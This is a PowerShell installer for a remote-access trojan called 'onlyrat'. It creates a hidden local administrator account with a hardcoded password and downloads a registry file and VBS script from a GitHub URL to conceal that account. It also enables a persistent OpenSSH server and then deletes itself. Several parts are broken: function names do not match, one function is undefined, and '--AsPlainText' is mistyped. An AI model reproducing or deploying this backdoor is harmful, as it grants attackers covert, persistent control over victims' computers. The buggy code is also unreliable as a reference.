#builds resources for rat
#randome string for directories

function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
  }
  
#creates local admin 
function create_$NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin, 
        [securestring] $Password
    )
    begin {
    }
    process {
    New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$uname" -Description "Temporary local admin" 
    Write-Verbose "$NewLocalAdmin local user crated" 
    Add-LocalGroupMember  -Group "Administrators" -Member "$NewLocalAdmin"
    Write-Verbose "$NewLocalAdmin added to local administrator group" 
    }
    end {
    }
}
$NewLocalAdmin = "onlyrat"
$Password = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force) 
create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# variables 
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location
$ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet)
.IPAddress

# create admin user
$uname = "onlyrat"
$pword = (ConvertTo-SecureString "onlyrat"--AsPlainText -Force) 
create_account -uname $uname -pword $pword


# goto temp , make working directory 
mkdir $path 
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/wrev.reg -OutFile "$wrev.reg"

# visual basic script to register the registry 
Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/calty.vbs -OutFile "$calty.vbs"

#enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~.0.1.0 
Start-Service sshd 
Set-Service -Name sshd -StartupType 'Automatic'

#install registry 
./wrev.reg; ./calty

#hide user
cd C:\Users
attrib +h +s +r onlyrat


# self delete
cd $initial_dir
del installer.ps1

